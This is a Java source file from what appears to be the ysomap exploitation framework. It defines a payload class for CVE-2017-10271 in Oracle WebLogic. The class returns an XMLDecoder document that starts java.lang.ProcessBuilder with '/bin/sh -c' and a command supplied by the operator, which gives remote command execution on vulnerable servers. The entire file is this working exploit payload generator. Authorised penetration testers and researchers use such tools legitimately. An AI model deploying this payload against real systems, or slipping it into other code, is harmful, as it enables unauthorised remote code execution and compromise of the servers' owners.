package ysomap.core.bullet.weblogic.xml;

import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;

/**
 * for CVE-2017-10271
 * @author wh1t3P1g
 * @since 2021/4/8
 */
@Bullets
public class WeblogicXMLRCEBullet extends Bullet<String> {

    @NotNull
    @Require(name = "cmd", detail = "command, for linux")
    public String cmd;

    @Override
    public String getObject() throws Exception {
        return "\t <java> \n" +
                "\t\t<void class=\"java.lang.ProcessBuilder\"> \n" +
                "\t\t  <array class=\"java.lang.String\" length=\"3\"> \n" +
                "\t\t\t<void index=\"0\"> \n" +
                "\t\t\t  <string>/bin/sh</string> \n" +
                "\t\t\t</void>  \n" +
                "\t\t\t<void index=\"1\"> \n" +
                "\t\t\t  <string>-c</string> \n" +
                "\t\t\t</void>  \n" +
                "\t\t\t<void index=\"2\"> \n" +
                "\t\t\t  <string>"+cmd+"</string>\n" +
                "\t\t\t</void>\n" +
                "\t\t  </array>\n" +
                "\t\t  <void method=\"start\"/> \n" +
                "\t\t</void>\n" +
                "\t  </java>";
    }
}
